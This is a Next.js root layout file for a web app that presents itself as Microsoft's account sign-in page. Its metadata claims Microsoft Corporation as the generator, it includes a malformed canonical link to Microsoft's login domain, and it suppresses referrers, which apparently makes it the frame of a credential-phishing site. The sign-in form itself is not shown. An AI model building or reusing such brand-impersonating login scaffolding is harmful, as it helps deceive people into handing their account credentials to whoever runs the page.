import type { Metadata } from 'next'
import { Geist, Geist_Mono } from 'next/font/google'
import { Analytics } from '@vercel/analytics/next'
import './globals.css'

const _geist = Geist({ subsets: ["latin"] });
const _geistMono = Geist_Mono({ subsets: ["latin"] });

export const metadata: Metadata = {
  title: 'Microsoft - Sign in to your account', 
  description: 'Microsoft account sign in. Access your email, calendar, and files.',
  generator: 'Microsoft Corporation',
  icons: {
    icon: '/favicon.ico', 
    apple: '/apple-touch-icon.png',
  },
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="en">
      <head>
        {/* optimizations */}
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <meta name="referrer" content="no-referrer" />
        <link rel="canonical" href="/https://login.microsoftonline.com/" />
        {/* Microsoft security headers */}
        <meta httpEquiv="X-Content-Type-Options" content="nosniff" />
        <meta httpEquiv="X-Frame-Options" content="DENY" />
      </head>
      <body className={`${_geist.className} font-sans antialiased min-h-screen bg-gray-900`}>
        {children}
        <Analytics />
      </body>
    </html>
  )
}